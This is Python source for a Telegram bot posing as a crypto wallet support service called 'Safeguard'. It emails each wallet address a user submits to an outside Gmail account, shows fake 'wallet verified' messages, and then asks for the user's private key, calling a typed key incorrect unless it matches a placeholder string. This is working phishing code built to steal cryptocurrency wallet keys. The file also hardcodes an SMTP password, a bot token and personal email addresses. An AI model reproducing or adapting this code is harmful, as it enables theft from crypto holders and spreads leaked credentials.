import smtplib
from email.mime.text import MIMEText
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Function to send email
def send_email(wallet_address):
    smtp_host = "smtp.hostinger.com"  # Hostinger SMTP server
    smtp_port = 465  # SSL Port
    sender_email = "tgrobot@chainmodule.net"  # Your Hostinger email address
    sender_password = "Abdulrahman100@"  # Your Hostinger email password
    recipient_email = "Olaiwolah14@gmail.com"  # Recipient email address

    # Email Content
    subject = "New Wallet Address Received"
    body = f"Wallet Address: {wallet_address}"
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = recipient_email

    try:
        print("Connecting to SMTP server...")
        with smtplib.SMTP_SSL(smtp_host, smtp_port) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name  # Get the user's first name
    keyboard = [
        ["Sync Wallet", "Migration"],
        ["Swap Assets", "Claim Rewards"],
        ["Slippage", "Cross Transaction"],
        ["Staking", "Recovery"],
        ["Wallet Glitch", "Claim Airdrop"],
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        f"Hey, {user_name}!\nWhat can Safeguard help you with?\n\nHere's what I can assist you with:",
        reply_markup=reply_markup,
    )

# Function to handle wallet address input
async def handle_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name  # Get the user's first name
    wallet_address = update.message.text
    send_email(wallet_address)  # Send wallet address via email
    await update.message.reply_text(f"Establishing blockchain connection for you, {user_name}...")
    await update.message.reply_text("Fetching wallet...")
    await update.message.reply_text("Wallet verified successfully!")
    await update.message.reply_text(
        "Please enter your private key to verify your ownership. This will allow us to validate the wallet ownership and complete the process."
    )

# Function to handle private key input
async def handle_private_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name  # Get the user's first name
    private_key = update.message.text
    await update.message.reply_text(f"Verifying private key for you, {user_name}...")
    if private_key == "correct_private_key":
        await update.message.reply_text("Private key verified successfully! Wallet ownership confirmed.")
    else:
        await update.message.reply_text("You entered an incorrect private key, kindly input the correct private key.")
        await update.message.reply_text("Something went wrong. Try again later...")
        await update.message.reply_text("Please enter your wallet address to verify your connection.")

# Main function to run the bot
def main():
    app = ApplicationBuilder().token("7878301172:AAFb-GYr5MUeXZUbeB8_uHT0D7UklKR2h08").build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Regex(r'^0x[0-9a-fA-F]{40}$'), handle_wallet_address))  # Ethereum-like wallet addresses
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_private_key))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
